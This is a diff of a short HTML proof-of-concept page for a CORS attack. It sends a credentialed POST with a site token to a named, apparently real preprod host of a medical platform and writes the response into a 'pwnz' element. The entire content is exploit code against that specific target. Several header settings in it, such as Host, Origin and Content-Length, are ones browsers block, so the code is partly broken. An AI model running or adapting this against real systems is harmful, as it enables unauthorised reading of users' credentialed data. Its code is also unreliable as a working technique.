@@ -10,14 +10,42 @@ cors proof-of-concept:
 
 <script>
 function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
+
+  const data = JSON.stringify({
+  'eventType': 1,
+  'location': 'https://preprod-mis.h24.ua/new/profile/doctor/calendar',
+  'siteToken': '25de1b372bca4235b4a28ac0ef7f5488',
+  'st': 2
+  });
+  
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
       document.getElementById("pwnz").innerHTML = this.responseText;
     }
   };
-  xhttp.open("GET", "https://https://preprod-mis.h24.ua/cdn-cgi/rum", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
+  xhr.withCredentials = true;
+  xhr.open('POST', 'https://preprod-mis.h24.ua/cdn-cgi/rum');
+  xhr.setRequestHeader('Host', 'preprod-mis.h24.ua');
+  xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0');
+  xhr.setRequestHeader('Accept', '*/*');
+  xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
+  xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate, br');
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.setRequestHeader('Referer', 'https://preprod-mis.h24.ua/');
+  xhr.setRequestHeader('Content-Length', '137');
+  xhr.setRequestHeader('Origin', 'https://alchemysan.github.io');
+  xhr.setRequestHeader('Sec-Fetch-Dest', 'empty');
+  xhr.setRequestHeader('Sec-Fetch-Mode', 'cors');
+  xhr.setRequestHeader('Sec-Fetch-Site', 'same-origin');
+  xhr.setRequestHeader('Priority', 'u=4');
+  xhr.setRequestHeader('Te', 'trailers');
+  
+  xhr.onload = function() {
+    console.log(xhr.response);
+  };
+  
+  xhr.send(data);
+  
 }
 </script>
